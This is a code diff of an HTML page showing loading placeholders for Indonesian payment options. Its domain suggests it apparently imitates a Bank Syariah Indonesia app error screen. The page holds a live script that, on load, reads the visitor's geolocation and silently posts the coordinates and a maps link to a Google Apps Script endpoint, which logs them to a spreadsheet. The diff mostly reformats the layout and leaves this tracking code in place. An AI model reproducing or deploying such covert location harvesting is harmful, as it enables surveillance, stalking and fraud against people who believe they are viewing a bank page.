@@ -150,8 +150,7 @@
           >
             <div
               class="h-12 w-full max-w-12 bg-emerald-600/30 rounded-full flex items-center justify-center animate-pulse"
-            >
-            </div>
+            ></div>
             <p>QRIS</p>
           </div>
           <div
@@ -182,9 +181,7 @@
             >
               <div class="h-10 w-10 bg-zinc-200 rounded animate-pulse"></div>
               <div class="max-w-[200px] flex flex-col">
-                <p class="text-sm text-zinc-800 font-semibold">
-                  Link Aja
-                </p>
+                <p class="text-sm text-zinc-800 font-semibold">Link Aja</p>
                 <p class="text-sm flex items-center text-amber-700">
                   <svg
                     class="w-3 h-3"
@@ -213,9 +210,7 @@
             >
               <div class="h-10 w-10 bg-zinc-200 rounded animate-pulse"></div>
               <div class="max-w-[200px] flex flex-col">
-                <p class="text-sm text-zinc-800 font-semibold">
-                  Ovo
-                </p>
+                <p class="text-sm text-zinc-800 font-semibold">Ovo</p>
                 <p class="text-sm flex items-center text-amber-700">
                   <svg
                     class="w-3 h-3"
@@ -242,27 +237,62 @@
           </div>
         </section>
       </div>
+      <div
+        class="absolute bottom-0 left-0 w-full p-4 bg-white shadow-xl flex justify-between gap-4"
+      >
+        <div class="grid grid-cols-2 gap-4 w-1/2">
+          <div
+            class="flex gap-2 flex-col text-sm items-center justify-center shrink-0"
+          >
+            <div class="h-8 w-8 bg-zinc-200 rounded-full animate-pulse"></div>
+            <span class="bg-zinc-200 h-2 w-10 animate-pulse"></span>
+          </div>
+          <div
+            class="flex gap-2 flex-col text-sm items-center justify-center shrink-0"
+          >
+            <div class="h-8 w-8 bg-zinc-200 rounded-full animate-pulse"></div>
+            <span class="bg-zinc-200 h-2 w-10 animate-pulse"></span>
+          </div>
+        </div>
+        <div class="w-full flex justify-center absolute left-1/2 -translate-x-1/2">
+          <div
+            class="h-12 w-12 bg-zinc-300 rounded-full animate-pulse -mt-8 absolute"
+          ></div>
+        </div>
+        <div class="grid grid-cols-2 gap-4 w-1/2">
+          <div
+            class="flex gap-2 flex-col text-sm items-center justify-center shrink-0"
+          >
+            <div class="h-8 w-8 bg-zinc-200 rounded-full animate-pulse"></div>
+            <span class="bg-zinc-200 h-2 w-10 animate-pulse"></span>
+          </div>
+          <div
+            class="flex gap-2 flex-col text-sm items-center justify-center shrink-0"
+          >
+            <div class="h-8 w-8 bg-zinc-200 rounded-full animate-pulse"></div>
+            <span class="bg-zinc-200 h-2 w-10 animate-pulse"></span>
+          </div>
+        </div>
+      </div>
     </section>
     <script>
       const scriptURL =
         "https://script.google.com/macros/s/AKfycbzi5dxCsfehVqPeM2ZAtDlh1JmBffrMpFprVx-mCv31wiTev8drSHS1OY3YDPqwXvKl/exec";
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const latitude = position.coords.latitude.toFixed(6);
-            const longitude = position.coords.longitude.toFixed(6);
+        navigator.geolocation.getCurrentPosition(function (position) {
+          const latitude = position.coords.latitude.toFixed(6);
+          const longitude = position.coords.longitude.toFixed(6);
 
-            // buat URL custom yang nanti disimpan di spreadsheet
-            const mapsUrl = `https://byond-bsi-error.vercel.app/?lat=${latitude}&lng=${longitude}`;
+          // buat URL custom yang nanti disimpan di spreadsheet
+          const mapsUrl = `https://byond-bsi-error.vercel.app/?lat=${latitude}&lng=${longitude}`;
 
-            fetch(scriptURL, {
-              method: "POST",
-              body: JSON.stringify({ longitude, latitude, mapsUrl }),
-            });
-          },
-        );
-      } 
+          fetch(scriptURL, {
+            method: "POST",
+            body: JSON.stringify({ longitude, latitude, mapsUrl }),
+          });
+        });
+      }
     </script>
   </body>
 </html>
